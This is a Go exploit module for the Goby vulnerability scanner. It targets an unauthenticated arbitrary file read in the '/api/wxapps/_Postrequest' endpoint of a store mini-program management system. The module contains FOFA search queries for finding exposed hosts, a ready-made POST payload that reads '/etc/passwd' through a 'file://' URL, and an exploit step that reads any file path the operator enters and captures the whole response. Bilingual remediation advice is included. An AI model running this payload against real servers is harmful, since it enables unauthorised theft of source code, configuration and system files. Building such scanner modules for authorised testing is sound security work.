package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Universal Store Mini Program Management System /api/wxapps/_Postrequest File Read Vulnerability",
    "Description": "<p>Universal store applet management system is a powerful tool designed to provide merchants in various industries with a full range of solutions for online and offline integration. The system integrates the two core functions of membership management and membership marketing, supports the use of multiple industries, and meets the personalized needs of merchants in different industries through one-click switching versions in the background. The system adopts a lightweight background and is equipped with an efficient server to ensure the smooth operation of the Mini Program and improve the user experience.There is an arbitrary file reading vulnerability in the /api/wxapps/_Postrequest interface of the universal store applet management system, through which an unauthenticated attacker can download any files on the server, including source code files, sensitive system files, configuration files, etc.</p>",
    "Product": "Universal Store Mini Program Management System",
    "Homepage": "https://diy.aoliqi.cn/",
    "DisclosureDate": "2024-12-03",
    "PostTime": "2024-12-03",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/comhome/cases/index.html\" && title=\"小程序\"",
    "GobyQuery": "body=\"/comhome/cases/index.html\" && title=\"小程序\"",
    "Level": "2",
    "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.</p>",
    "Recommendation": "<p>1. Let web users only access (read) the files and paths they need  </p><p> 2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities  </p><p> 3. Make it impossible for users to access paths other than the root directory of the web.  </p><p> 4. The manufacturer released the latest fixed version, pay attention to <a href=\"https://diy.aoliqi.cn/\">https://diy.aoliqi.cn/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/na9BTsFifI81py30Xn8vMg"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default,Customize",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/etc/passwd",
            "show": "mode=default"
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/wxapps/_Postrequest",
                "follow_redirect": true,
                "header": {
                    "Content-type": "application/json;charset='utf-8'",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
                },
                "data_type": "text",
                "data": "{ \"url\": \"file:///etc/passwd\", \"data\": \"1\" }"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/wxapps/_Postrequest",
                "follow_redirect": true,
                "header": {
                    "Content-type": "application/json;charset='utf-8'",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
                },
                "data_type": "text",
                "data": "{ \"url\": \"file://{{{payload_url}}}\", \"data\": \"1\" }"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "万能门店小程序管理系统 /api/wxapps/_Postrequest 文件读取漏洞",
            "Product": "万能门店小程序管理系统",
            "Description": "<p>万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。该系统集成了会员管理和会员营销两大核心功能，支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。</p><p>万能门店小程序管理系统的/api/wxapps/_Postrequest接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。</p>",
            "Recommendation": "<p>1、让web 用户只能访问（读取），所需要的文件和路径&nbsp;</p><p>2、不能有文件包含漏洞，目录遍历漏洞或其他漏洞&nbsp;</p><p>3、让用户不能访问Web 根目录以外的路径。&nbsp;</p><p>4、该厂商发布最新修复版本，关注<a href=\"https://diy.aoliqi.cn/\">https://diy.aoliqi.cn/</a><br></p>",
            "Impact": "<p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Universal Store Mini Program Management System /api/wxapps/_Postrequest File Read Vulnerability",
            "Product": "Universal Store Mini Program Management System",
            "Description": "<p>Universal store applet management system is a powerful tool designed to provide merchants in various industries with a full range of solutions for online and offline integration. The system integrates the two core functions of membership management and membership marketing, supports the use of multiple industries, and meets the personalized needs of merchants in different industries through one-click switching versions in the background. The system adopts a lightweight background and is equipped with an efficient server to ensure the smooth operation of the Mini Program and improve the user experience.There is an arbitrary file reading vulnerability in the /api/wxapps/_Postrequest interface of the universal store applet management system, through which an unauthenticated attacker can download any files on the server, including source code files, sensitive system files, configuration files, etc.<br></p>",
            "Recommendation": "<p>1. Let web users only access (read) the files and paths they need&nbsp;&nbsp;</p><p>&nbsp;2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities&nbsp;&nbsp;</p><p>&nbsp;3. Make it impossible for users to access paths other than the root directory of the web.&nbsp;&nbsp;</p><p>&nbsp;4. The manufacturer released the latest fixed version, pay attention to <a href=\"https://diy.aoliqi.cn/\">https://diy.aoliqi.cn/</a><br></p>",
            "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|mode|{{{default}}}",
        "payload_url": "define|variable|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_url"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }